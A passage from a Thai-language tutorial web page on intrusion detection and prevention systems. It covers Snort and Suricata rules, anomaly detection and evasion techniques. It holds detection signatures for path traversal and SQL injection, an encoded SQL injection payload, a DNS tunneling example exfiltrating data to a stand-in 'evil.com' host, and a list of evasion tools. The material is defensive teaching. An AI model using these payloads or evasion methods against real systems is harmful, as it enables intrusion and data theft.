+    <tr><td>การตอบสนอง</td><td>Manual (Admin ดู Alert)</td><td>Automatic (Real-time Block)</td></tr>
+    <tr><td>การทำ Forensic</td><td>✅ ดี (เก็บ Log ได้หมด)</td><td>ปานกลาง (Block ก่อนเห็น)</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section1-4" class="section-ref">1.4 ความสัมพันธ์กับ Firewall</h3>
+<p>Firewall และ IDS/IPS เป็นเทคโนโลยีที่เสริมกัน ไม่ใช่แทนที่กัน:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>การเปรียบเทียบ:
+─────────────────
+Firewall:  "อนุญาตหรือปฏิเสธตามกฎ"       ← Policy-Based
+IDS/IPS:   "ตรวจจับและป้องกันการโจมตี"   ← Threat-Based
+
+Firewall = ประตูรั้วบ้าน    (ใครเข้าออกได้บ้าง)
+IDS      = กล้องวงจรปิด     (เฝ้าดูว่ามีคนร้ายไหม)
+IPS      = รปภ.ที่ประตู     (ตรวจสอบและห้ามคนร้ายเข้าทันที)</pre>
+<div class="table-wrap"><table>
+  <thead><tr><th>อุปกรณ์</th><th>การตัดสินใจ</th><th>ขึ้นอยู่กับ</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td>Firewall</td><td>Allow / Deny</td><td>IP:Port, Protocol, App-ID, User-ID</td><td>ปฏิเสธ SSH จาก Internet</td></tr>
+    <tr><td>IDS</td><td>Alert / Log</td><td>Signature, Anomaly, Behavioral Pattern</td><td>แจ้งเตือนเมื่อพบ SQL Injection</td></tr>
+    <tr><td>IPS</td><td>Block / Pass</td><td>Signature, Anomaly, Reputation</td><td>บล็อก Traffic ที่มี Payload ของ Exploit</td></tr>
+    <tr><td>NGFW</td><td>Allow / Deny + IPS</td><td>รวมทุกอย่าง</td><td>Allow HTTPS แต่ตรวจสอบ SSL ด้วย IPS</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<section id="section2" class="section-ref">
+<h2>2. ประเภทของ IDS/IPS</h2>
+
+<h3 id="section2-1" class="section-ref">2.1 Network-based IDS/IPS (NIDS/NIPS)</h3>
+<p><strong>ตำแหน่ง:</strong> วางบนจุดยุทธศาสตร์ของเครือข่าย — ตรวจสอบ Traffic ที่ผ่านทั้ง Segment</p>
+<p><strong>ข้อดี:</strong></p>
+<ul>
+  <li>ตรวจสอบ Traffic ในวงกว้าง — ครอบคลุมหลายระบบ</li>
+  <li>ติดตั้งง่าย — ไม่ต้องติดตั้ง Agent บนโฮสต์</li>
+  <li>ไม่ส่งผลกระทบต่อระบบที่ได้รับการตรวจสอบ</li>
+  <li>ตรวจจับการโจมตีที่มุ่งเป้าไปที่ Network Protocol</li>
+</ul>
+<p><strong>ข้อจำกัด:</strong></p>
+<ul>
+  <li>ตรวจสอบ Traffic ที่เข้ารหัส (SSL/TLS) ไม่ได้ (ถ้าไม่มี SSL Decryption)</li>
+  <li>อาจไม่เห็น Traffic ใน Switch Segment ที่ไม่ได้ Mirror</li>
+  <li>ประสิทธิภาพเป็นปัญหากับเครือข่ายความเร็วสูง (40G, 100G)</li>
+  <li>ไม่สามารถตรวจจับการโจมตีที่เกิดขึ้นภายในโฮสต์ได้</li>
+</ul>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>การวาง NIDS:
+─────────────
+Internet ──▶ [Firewall] ──▶ [Switch] ──▶ Internal Network
+                                  │
+                             [SPAN Port]
+                                  │
+                             [NIDS Sensor]
+                                  │
+                            [SIEM / Alert]</pre>
+
+<h3 id="section2-2" class="section-ref">2.2 Host-based IDS/IPS (HIDS/HIPS)</h3>
+<p><strong>ตำแหน่ง:</strong> ติดตั้งเป็น Agent บนเครื่อง Server, Workstation, หรือ Endpoint</p>
+<p><strong>ข้อดี:</strong></p>
+<ul>
+  <li>ตรวจสอบกิจกรรมภายในโฮสต์ — File Access, Process, Registry, System Call</li>
+  <li>ตรวจจับการโจมตีที่ NIDS ไม่เห็น (Encrypted Traffic, Local Attack)</li>
+  <li>ตรวจสอบ Integrity ของไฟล์ (File Integrity Monitoring — FIM)</li>
+  <li>ตรวจจับ Malware ที่ทำงานบนเครื่อง</li>
+</ul>
+<p><strong>ข้อจำกัด:</strong></p>
+<ul>
+  <li>ใช้ทรัพยากรของโฮสต์ (CPU, RAM, Disk)</li>
+  <li>ต้องติดตั้งและจัดการ Agent ทุกเครื่อง</li>
+  <li>อาจถูกโจมตีปิดการทำงาน (Disable) หากผู้โจมตีได้สิทธิ์ Admin</li>
+  <li>ไม่เห็นภาพรวมของเครือข่าย</li>
+</ul>
+<p><strong>ตัวอย่าง HIDS ที่นิยม:</strong></p>
+<ul>
+  <li><strong>OSSEC:</strong> Open Source HIDS — Log Analysis, FIM, Rootkit Detection</li>
+  <li><strong>Wazuh:</strong> Fork ของ OSSEC — รวมกับ SIEM และ Elastic Stack</li>
+  <li><strong>Osquery:</strong> ใช้ SQL Query เพื่อตรวจสอบระบบ (Facebook)</li>
+  <li><strong>Sysmon (Microsoft):</strong> เก็บ Event Detail บน Windows</li>
+</ul>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ตัวอย่าง Log จาก OSSEC HIDS:
+─────────────────────────────
+** Alert 1712839200.12345 - syscheck
+Rule: 550 (syscheck_new_entry)
+File: /etc/shadow
+Action: added
+User: root
+Hostname: webserver01</pre>
+
+<h3 id="section2-3" class="section-ref">2.3 Wireless IDS/IPS (WIDS/WIPS)</h3>
+<p><strong>ตำแหน่ง:</strong> ตรวจสอบคลื่นวิทยุ 802.11 เพื่อตรวจจับภัยคุกคามทาง Wi-Fi</p>
+<p><strong>ความสามารถ:</strong></p>
+<ul>
+  <li>ตรวจจับ Rogue Access Point</li>
+  <li>ตรวจจับ Evil Twin Attack</li>
+  <li>ตรวจจับ Deauthentication Attack</li>
+  <li>ตรวจจับ KRACK และ WPA2 Vulnerability Exploitation</li>
+  <li>ตรวจจับ Client Misassociation</li>
+</ul>
+
+<h3 id="section2-4" class="section-ref">2.4 Network Behavior Analysis (NBA)</h3>
+<p>NBA วิเคราะห์พฤติกรรมของ Traffic ในภาพรวม (ไม่เน้นที่เนื้อหาแต่ละ Packet) เพื่อตรวจจับ Anomaly:</p>
+<p><strong>สิ่งที่ NBA ตรวจจับ:</strong></p>
+<ul>
+  <li><strong>Traffic Spike:</strong> การโจมตี DDoS หรือ WannaCry-style Worm Propagation</li>
+  <li><strong>Unusual Protocol:</strong> Protocol ที่ไม่เคยปรากฏในเครือข่ายมาก่อน</li>
+  <li><strong>Beaconing:</strong> การติดต่อ Command & Control (C2) เป็นช่วงๆ</li>
+  <li><strong>Data Exfiltration:</strong> การส่งข้อมูลปริมาณมากออกนอกเครือข่ายผิดปกติ</li>
+</ul>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ตัวอย่าง NBA Detection:
+────────────────────────
+Time 00:00 - 06:00:  Traffic = 150 Mbps (Baseline)
+Time 06:00 - 06:05:  Traffic = 3.2 Gbps (Anomaly detected)
+Time 06:05:          Alerta! — DDoS Attack suspected
+                     Source IPs: 12,847 unique IPs
+                     Dest Port:  443 (HTTPS)
+                     Action:     Blackhole routing triggered</pre>
+
+<h3 id="section2-5" class="section-ref">2.5 ตารางเปรียบเทียบประเภท IDS/IPS</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>ตำแหน่ง</th><th>ตรวจสอบ</th><th>จุดเด่น</th><th>จุดอ่อน</th></tr></thead>
+  <tbody>
+    <tr><td>NIDS/NIPS</td><td>เครือข่าย</td><td>Network Traffic</td><td>ครอบคลุมหลายระบบ</td><td>ไม่เห็น Encrypted Traffic</td></tr>
+    <tr><td>HIDS/HIPS</td><td>โฮสต์</td><td>System Calls, Files, Processes</td><td>ละเอียดระดับโฮสต์</td><td>ใช้ทรัพยากรโฮสต์</td></tr>
+    <tr><td>WIDS/WIPS</td><td>อากาศ</td><td>802.11 Frames</td><td>ตรวจจับ Rogue AP</td><td>ครอบคลุมเฉพาะ Wi-Fi</td></tr>
+    <tr><td>NBA</td><td>เครือข่าย</td><td>Traffic Pattern</td><td>ตรวจจับ Anomaly</td><td>ไม่ตรวจจับ Attack Detail</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<section id="section3" class="section-ref">
+<h2>3. Signature-based Detection</h2>
+
+<h3 id="section3-1" class="section-ref">3.1 หลักการ</h3>
+<p>Signature-based Detection เปรียบเทียบกิจกรรมบนเครือข่ายหรือระบบกับ <strong>ลายเซ็น (Signature)</strong> ของการโจมตีที่รู้จัก — คล้ายกับ Antivirus ที่ใช้ Virus Definition ในการตรวจจับ Malware</p>
+<p><strong>ตัวอย่าง Signature (รูปแบบง่าย):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ตรวจจับ:   /etc/passwd ใน HTTP Request → Path Traversal Attack
+Signature: content:"/etc/passwd"; http_uri;</pre>
+
+<h3 id="section3-2" class="section-ref">3.2 ประเภทของ Signature</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท Signature</th><th>คำอธิบาย</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Content-Based</strong></td><td>ตรงกับ Byte Sequence ใน Payload</td><td><code>content:"|FF D8 FF E0|"</code> (JPEG Header)</td></tr>
+    <tr><td><strong>Context-Based</strong></td><td>ตรวจสอบตามบริบท (ขนาด, ความถี่)</td><td><code>dsize:>1000;</code> (Packet Size)</td></tr>
+    <tr><td><strong>Protocol-Based</strong></td><td>ตรวจสอบตาม Protocol RFC</td><td>ตรวจสอบ HTTP Header ที่ผิดปกติ</td></tr>
+    <tr><td><strong>State-Based</strong></td><td>ตรวจสอบตาม State ของ Connection</td><td>Login Fail ติดต่อกัน 5 ครั้ง</td></tr>
+    <tr><td><strong>Compound</strong></td><td>หลายเงื่อนไขรวมกัน</td><td>Content + Size + Port</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section3-3" class="section-ref">3.3 Snort Rule — รูปแบบและไวยากรณ์</h3>
+<p>Snort Rule แบ่งเป็น 2 ส่วน: <strong>Rule Header</strong> และ <strong>Rule Options</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>โครงสร้าง Snort Rule:
+─────────────────────
+[Action] [Protocol] [Source IP] [Source Port] → [Dest IP] [Dest Port] ([Options])
+
+ตัวอย่าง:
+alert   tcp        any          any         →   any          80    (msg:"SQL Injection Detected"; content:"SELECT"; nocase; sid:1000001;)</pre>
+<p><strong>ส่วนประกอบของ Rule Header:</strong></p>
+<ul>
+  <li><code>alert</code> — Action: alert, log, pass, drop, reject, sdrop</li>
+  <li><code>tcp</code> — Protocol: tcp, udp, icmp, ip</li>
+  <li><code>any any</code> — Source IP และ Port (หรือระบุเจาะจง)</li>
+  <li><code>→</code> — ทิศทาง (→, &lt;&gt;, ←)</li>
+  <li><code>any 80</code> — Destination IP และ Port</li>
+</ul>
+<p><strong>ส่วนประกอบของ Rule Options (คั่นด้วย ;):</strong></p>
+<ul>
+  <li><code>msg:"..."</code> — ข้อความแจ้งเตือน</li>
+  <li><code>content:"..."</code> — Byte Pattern ที่ต้องการค้นหา</li>
+  <li><code>nocase</code> — ไม่สนใจตัวพิมพ์เล็ก-ใหญ่</li>
+  <li><code>sid:XXXX</code> — Signature ID (ไม่ซ้ำกัน)</li>
+  <li><code>rev:N</code> — Revision Number</li>
+  <li><code>reference:...,...</code> — ลิงก์อ้างอิง (CVE, URL)</li>
+  <li><code>classtype:...</code> — ประเภทการโจมตี</li>
+</ul>
+
+<h3 id="section3-4" class="section-ref">3.4 ตัวอย่าง Snort Rules</h3>
+<p><strong>Rule 1: ตรวจจับ SQL Injection พื้นฐาน</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
+    msg:"SQL Injection - UNION SELECT Detected";
+    content:"UNION"; nocase;
+    content:"SELECT"; nocase; distance:0; within:10;
+    flow:to_server,established;
+    sid:1000001; rev:1;
+    classtype:web-application-attack;
+    reference:cve,2023-1234;
+)</pre>
+<p><strong>Rule 2: ตรวจจับ Buffer Overflow ใน HTTP Header</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
+    msg:"Buffer Overflow - Long HTTP Header";
+    dsize:>4096;
+    flow:to_server,established;
+    sid:1000002; rev:1;
+    classtype:attempted-admin;
+)</pre>
+<p><strong>Rule 3: ตรวจจับ Port Scan</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>alert tcp $EXTERNAL_NET any -> $HOME_NET any (
+    msg:"Port Scan Detected";
+    flags:S;          # SYN flag only
+    threshold:type both, track by_src, count 20, seconds 10;
+    sid:1000003; rev:1;
+    classtype:attempted-recon;
+)</pre>
+<p><strong>Rule 4: ตรวจจับ Malware C2 Beaconing</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
+    msg:"Malware C2 Beacon - Suspicious User-Agent";
+    content:"User-Agent|3A|"; http_header;
+    content:"Mozilla/5.0"; distance:0;
+    pcre:"/^User-Agent:\s*\S{10,30}$/Hmi";
+    flow:to_server,established;
+    sid:1000004; rev:1;
+    classtype:trojan-activity;
+)</pre>
+
+<h3 id="section3-5" class="section-ref">3.5 ข้อดีและข้อจำกัดของ Signature-based Detection</h3>
+<p><strong>ข้อดี:</strong></p>
+<ul>
+  <li>ความแม่นยำสูงสำหรับการโจมตีที่รู้จัก (False Positive ต่ำ)</li>
+  <li>ตรวจจับได้เร็ว — ใช้ Resource น้อย</li>
+  <li>สามารถระบุประเภทการโจมตีที่แน่นอนได้</li>
+  <li>ง่ายต่อการอัปเดต (เพิ่ม Signature ใหม่เมื่อรู้จัก Attack ใหม่)</li>
+</ul>
+<p><strong>ข้อจำกัด:</strong></p>
+<ul>
+  <li><strong>ไม่สามารถตรวจจับ Zero-Day Attack</strong> — การโจมตีที่ไม่มี Signature</li>
+  <li><strong>Signature Evasion</strong> — ผู้โจมตีสามารถหลบเลี่ยงได้ (Polymorphic Code, Encoding)</li>
+  <li>ต้องอัปเดต Signature Database อย่างสม่ำเสมอ</li>
+  <li>Signature ที่ซับซ้อนเกินไปอาจทำให้ประสิทธิภาพลดลง</li>
+  <li><strong>False Negative สูง</strong> หาก Signature ไม่ตรงกับ Variant ของการโจมตี</li>
+</ul>
+</section>
+<hr>
+
+<section id="section4" class="section-ref">
+<h2>4. Anomaly-based Detection</h2>
+
+<h3 id="section4-1" class="section-ref">4.1 หลักการ</h3>
+<p>Anomaly Detection สร้าง <strong>Baseline</strong> ของพฤติกรรมปกติของเครือข่ายหรือระบบ แล้วแจ้งเตือนเมื่อพฤติกรรมเบี่ยงเบนไปจาก Baseline อย่างมีนัยสำคัญ</p>
+<p><strong>กระบวนการทำงาน:</strong></p>
+<ol>
+  <li><strong>Learning Phase (Training):</strong> เก็บข้อมูลพฤติกรรมปกติในช่วงเวลาหนึ่ง (1-4 สัปดาห์)</li>
+  <li><strong>Modeling:</strong> สร้าง Statistical Model ของพฤติกรรมปกติ</li>
+  <li><strong>Detection Phase:</strong> เปรียบเทียบพฤติกรรมปัจจุบันกับ Model</li>
+  <li><strong>Alerting:</strong> เมื่อค่าเบี่ยงเบนเกิน Threshold ที่กำหนด</li>
+</ol>
+
+<h3 id="section4-2" class="section-ref">4.2 ประเภทของ Anomaly Detection</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>ประเภท</th><th>สิ่งที่วัด</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Statistical</strong></td><td>ค่าเฉลี่ย, SD, Distribution</td><td>Traffic ที่เพิ่มขึ้น 5 SD จากค่าเฉลี่ย</td></tr>
+    <tr><td><strong>Machine Learning</strong></td><td>Pattern จาก Train Set</td><td>แยก Normal/Attack ด้วย Decision Tree</td></tr>
+    <tr><td><strong>Protocol-based</strong></td><td>การปฏิบัติตาม RFC</td><td>HTTP Request ที่ผิดรูปแบบ</td></tr>
+    <tr><td><strong>Traffic-based</strong></td><td>ปริมาณ, ความถี่, Flow Size</td><td>ICMP Flood, DNS Amplification</td></tr>
+  </tbody>
+</table></div>
+
+<h3 id="section4-3" class="section-ref">4.3 Behavioral-based Detection (UEBA)</h3>
+<p>UEBA (User and Entity Behavior Analytics) คือเทคนิค Anomaly Detection ที่มุ่งเน้นพฤติกรรมของผู้ใช้และอุปกรณ์:</p>
+<p><strong>พฤติกรรมที่ UEBA ตรวจสอบ:</strong></p>
+<ul>
+  <li><strong>User Login:</strong> เวลา, สถานที่, อุปกรณ์ที่ผิดปกติ</li>
+  <li><strong>Data Access:</strong> การเข้าถึงข้อมูลที่ไม่เคยเข้าถึงมาก่อน</li>
+  <li><strong>Lateral Movement:</strong> การเข้าถึงระบบอื่นหลังจาก Login</li>
+  <li><strong>Privilege Escalation:</strong> การใช้สิทธิ์ที่สูงขึ้นผิดปกติ</li>
+</ul>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ตัวอย่าง UEBA Alert:
+────────────────────
+User: john.smith (HR Department)
+Event: Logged into DB Server (db-prod-01) at 03:14 AM
+       This is the FIRST time this user accessed this server.
+       User has NEVER logged in outside business hours (08:00-18:00).
+       GeoIP: Login from 185.220.101.x (Tor Exit Node)
+
+Risk Score: 92/100 → 🔴 CRITICAL
+MITRE ATT&CK: T1078 (Valid Accounts) + T1530 (Data from Cloud Storage)</pre>
+
+<h3 id="section4-4" class="section-ref">4.4 ข้อดีและข้อจำกัดของ Anomaly-based Detection</h3>
+<p><strong>ข้อดี:</strong></p>
+<ul>
+  <li>ตรวจจับ Zero-Day Attack และ Novel Attack ได้</li>
+  <li>ตรวจจับ Insider Threat ที่ใช้ Credentials ถูกต้อง</li>
+  <li>ปรับตัวตามสภาพแวดล้อมได้ (Adaptive Baseline)</li>
+  <li>ตรวจจับ Malware C2 Beaconing และ Data Exfiltration ได้ดี</li>
+</ul>
+<p><strong>ข้อจำกัด:</strong></p>
+<ul>
+  <li><strong>False Positive สูง</strong> — การเปลี่ยนแปลงปกติ (Maintenance, การใช้งานตามฤดูกาล) อาจได้รับการตีความว่าเป็น Anomaly</li>
+  <li>ต้องมีข้อมูล Training ที่เพียงพอ</li>
+  <li>Baseline อาจล้าสมัย (Concept Drift)</li>
+  <li>ผู้โจมตีสามารถ "ฝึก" ระบบให้ชินกับพฤติกรรมผิดปกติได้ (Slow Drip Exfiltration)</li>
+  <li>ใช้ทรัพยากรมากกว่า Signature-based</li>
+</ul>
+</section>
+<hr>
+
+<section id="section5" class="section-ref">
+<h2>5. Stateful Protocol Analysis</h2>
+
+<h3 id="section5-1" class="section-ref">5.1 หลักการ</h3>
+<p>Stateful Protocol Analysis ตรวจสอบ Protocol Traffic ตามที่กำหนดใน RFC (Request for Comments) โดยติดตาม State ของ Protocol Session ตั้งแต่ต้นจนจบ</p>
+
+<h3 id="section5-2" class="section-ref">5.2 Protocol Violation Detection</h3>
+<p>ตรวจจับการกระทำที่ไม่เป็นไปตาม Protocol RFC:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ตัวอย่าง Protocol Violation:
+─────────────────────────────
+1. SMTP: Command Sequence ผิด → RCPT TO ก่อน MAIL FROM
+2. HTTP: Content-Length ≠ Actual Body Size
+3. TLS: Certificate ที่หมดอายุหรือ Self-Signed
+4. DNS: Response ที่มี Size เกิน 512 bytes โดยไม่มี EDNS0
+5. TCP: Flag Combination ที่ผิดปกติ (SYN-FIN, SYN-RST)</pre>
+
+<h3 id="section5-3" class="section-ref">5.3 การตรวจจับที่ซับซ้อนด้วย Protocol Analysis</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>ตัวอย่าง: ตรวจจับ HTTP Request Smuggling
+────────────────────────────────────────
+การโจมตี: ส่ง HTTP Request ที่มี Content-Length และ Transfer-Encoding
+           พร้อมกัน — ทำให้ Front-end Proxy และ Back-end Server
+           ตีความ Body แตกต่างกัน
+
+Detection Signature ใน Suricata:
+─────────────────────────────────
+alert http any any -> any any (
+    msg:"HTTP Request Smuggling - CL.TE";
+    flow:to_server,established;
+    http.request_header;
+    content:"Transfer-Encoding"; nocase;
+    content:"Content-Length"; nocase;
+    sid:2000001; rev:1;
+)</pre>
+
+<h3 id="section5-4" class="section-ref">5.4 ข้อดีและข้อจำกัด</h3>
+<p><strong>ข้อดี:</strong></p>
+<ul>
+  <li>แม่นยำสำหรับ Protocol-Level Attack</li>
+  <li>ตรวจจับ Attack ที่ Signature-Based อาจพลาดได้</li>
+  <li>ช่วยลด False Positive (เข้าใจ Context ของ Protocol)</li>
+</ul>
+<p><strong>ข้อจำกัด:</strong></p>
+<ul>
+  <li>ใช้ทรัพยากรมาก (ต้อง Decode Protocol แต่ละ Layer)</li>
+  <li>Protocol ใหม่ๆ ต้องเขียน Parser ใหม่</li>
+  <li>Protocol ที่ซับซ้อน (SMB, DCE/RPC) ต้องใช้ Parser ขนาดใหญ่</li>
+  <li>อาจมี Bugs ใน Parser เอง (Protocol Parser Vulnerability)</li>
+</ul>
+</section>
+<hr>
+
+<section id="section6" class="section-ref">
+<h2>6. การหลบเลี่ยงการตรวจจับ (Evasion Techniques)</h2>
+
+<h3 id="section6-1" class="section-ref">6.1 Fragmentation</h3>
+<p>ผู้โจมตีแบ่ง Payload ออกเป็น Fragment ย่อยๆ เพื่อหลบเลี่ยง Signature ที่รอ Pattern ใน Packet เดียว:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Normal Packet:
+────────────────────────────────────────
+[IP Header] [TCP Header] [GET /etc/passwd HTTP/1.1]
+
+Fragmented:
+────────────────────────────────────────
+Fragment 1: [IP Header] [TCP Header] [GET /etc]
+Fragment 2: [IP Header] [/passwd HTT]
+Fragment 3: [IP Header] [P/1.1]
+
+IDS: แต่ละ Fragment อาจไม่ตรง Signature
+IPS/Firewall: ต้อง Reassemble ก่อนตรวจสอบ</pre>
+<p><strong>การป้องกัน:</strong> IDS/IPS ต้องทำ IP Reassembly และ TCP Reassembly ก่อนตรวจสอบ — Snort ใช้ <code>frag3</code> Preprocessor</p>
+
+<h3 id="section6-2" class="section-ref">6.2 Encoding</h3>
+<p>ผู้โจมตีแปลง Payload ให้อยู่ในรูปแบบอื่นที่ Server เข้าใจ แต่ IDS อาจไม่เข้าใจ:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>SQL Injection แบบเข้ารหัส:
+───────────────────────────
+ปกติ:     ' OR 1=1 --
+Hex:      0x27204f5220313d31202d2d
+URL Encode: %27%20OR%201%3D1%20--
+Unicode:  %u0027%u0020OR%u00201%u003D1%u0020%u002D%u002D
+Base64:   JyBPUiAxPTEgLS0=
+UTF-16:   \x27\x00\x20\x00\x4F\x00\x52\x00\x20\x00...
+
+IDS ที่ตรวจเจอ: ' OR 1=1 --
+IDS ที่ตรวจเจอ: %27%20OR%201%3D1%20-- ❌ (อาจไม่ detect ถ้าไม่มี Signature)</pre>
+<p><strong>การป้องกัน:</strong> IDS ต้องมี Normalization Engine ที่แปลง Encoding กลับเป็นรูปแบบปกติก่อนตรวจสอบ (Snort: <code>http_inspect</code>, Suricata: <code>http.request_uri</code>)</p>
+
+<h3 id="section6-3" class="section-ref">6.3 Encryption</h3>
+<p>Traffic ที่เข้ารหัส (HTTPS, SSH, VPN) ทำให้ IDS/IPS ไม่สามารถตรวจสอบ Content ได้:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Client ──[HTTPS Encrypted]──▶ Server
+         │
+    NIDS ❌ (มองไม่เห็น Content)
+         │
+SSL Forward Proxy:  ตรวจสอบได้ (แต่ต้องติดตั้ง CA)</pre>
+<p><strong>ทางออก:</strong></p>
+<ol>
+  <li><strong>SSL Decryption (SSL Forward Proxy)</strong> — ถอดรหัส ตรวจสอบ แล้วเข้ารหัสใหม่</li>
+  <li><strong>Traffic Metadata Analysis</strong> — ตรวจสอบขนาด Packet, Timing, Certificate Info (JA3 Fingerprint)</li>
+  <li><strong>HIDS</strong> — Agent บนเครื่องสามารถมองเห็น Traffic หลังจาก Decryption แล้ว</li>
+</ol>
+
+<h3 id="section6-4" class="section-ref">6.4 Protocol Obfuscation</h3>
+<p>ผู้โจมตีใช้ Protocol ที่ผิดปกติหรือซ่อน Traffic ใน Protocol ที่อนุญาต:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Tunneling ใน DNS:
+───────────────────
+Client query:   c2VjcmV0X2RhdGE=.malware-c2.evil.com
+DNS Response:   TXT "Y29tbWFuZCA9IGNhdCAvZXRjL3Bhc3N3ZA=="
+
+IDS: DNS Query ปกติ → อาจไม่ตรวจสอบ TXT Record Detail
+Prevention: DNS Sinkhole, DNS Firewall with DPI</pre>
+
+<h3 id="section6-5" class="section-ref">6.5 Tool-Assisted Evasion</h3>
+<p>เครื่องมือที่นิยมใช้หลบเลี่ยง IDS:</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>เครื่องมือ</th><th>เทคนิค</th><th>รายละเอียด</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Nmap</strong></td><td>Multiple Scan Techniques</td><td>FIN Scan, NULL Scan, Fragment Scan, Decoy Scan</td></tr>
+    <tr><td><strong>Metasploit</strong></td><td>Payload Encoding</td><td><code>shikata_ga_nai</code> — Polymorphic XOR Encoder</td></tr>
+    <tr><td><strong>SQLMap</strong></td><td>SQL Injection Evasion</td><td>Tamper Scripts — Space2Comment, Char2Encode</td></tr>
+    <tr><td><strong>Veil</strong></td><td>AV/IDS Evasion</td><td>เครื่องมือสร้าง Payload ที่หลบเลี่ยง Signature</td></tr>
+    <tr><td><strong>HTTPS Tunneling</strong></td><td>Protocol Tunneling</td><td>ซ่อน C2 Traffic ใน HTTPS</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<section id="section7" class="section-ref">
+<h2>7. Snort</h2>
+
+<h3 id="section7-1" class="section-ref">7.1 ภาพรวม</h3>
+<p>Snort คือ Open Source NIDS/NIPS ที่พัฒนาโดย Martin Roesch ในปี 1998 (ปัจจุบันเป็นของ Cisco) เป็นเครื่องมือ IDS/IPS ที่ได้รับการใช้อย่างแพร่หลายที่สุดในโลก</p>
+<p><strong>โหมดการทำงาน:</strong></p>
+<ul>
+  <li><strong>Sniffer Mode:</strong> อ่าน Packet แล้วแสดงบน Console</li>
+  <li><strong>Packet Logger Mode:</strong> บันทึก Packet ลง Disk</li>
+  <li><strong>NIDS Mode:</strong> วิเคราะห์ Traffic ตาม Rule Set</li>
+  <li><strong>Inline Mode:</strong> ทำงานเป็น IPS (กับ iptables/NFQueue)</li>
+</ul>
+
+<h3 id="section7-2" class="section-ref">7.2 สถาปัตยกรรม Snort</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>                            Snort Engine
+┌──────────────────────────────────────────────────────────┐
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
+│  │ Decode   │  │Preproces-│  │Detection │  │Output    │ │
+│  │ Engine   │─▶│sor       │─▶│Engine    │─▶│Module    │ │
+│  └──────────┘  └──────────┘  └──────────┘  └──────────┘ │
+│        │            │              │              │       │
+│  Libpcap/    frag3,    Rule Pattern   Alert: syslog, │
+│  NFQueue     stream5,  Matching       unified2, JSON  │
+│              http_inspect              (lua output)   │
+└──────────────────────────────────────────────────────────┘</pre>
+<p><strong>ส่วนประกอบ:</strong></p>
+<ol>
+  <li><strong>Decoder:</strong> แยกส่วนประกอบของ Packet (Ethernet, IP, TCP, UDP, ICMP)</li>
+  <li><strong>Preprocessors:</strong> จัดเตรียมข้อมูลก่อนส่งให้ Detection Engine (Reassembly, Normalization)</li>
+  <li><strong>Detection Engine:</strong> เปรียบเทียบ Packet กับ Rule Set</li>
+  <li><strong>Output Module:</strong> จัดการการแจ้งเตือน (Syslog, Database, JSON File)</li>
+</ol>
+
+<h3 id="section7-3" class="section-ref">7.3 Preprocessors ที่สำคัญ</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Preprocessor</th><th>หน้าที่</th></tr></thead>
+  <tbody>
